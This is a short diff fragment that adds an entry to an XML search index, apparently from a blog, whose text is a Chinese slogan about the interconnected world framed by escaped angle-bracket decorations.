+    <content type="text"><![CDATA[&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;我的地盘我做主！弹指一挥间，世界皆互联!&lt;&lt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&lt;&gt;&gt;&gt;&gt;&gt;]]></content>
+  </entry>
 </search>
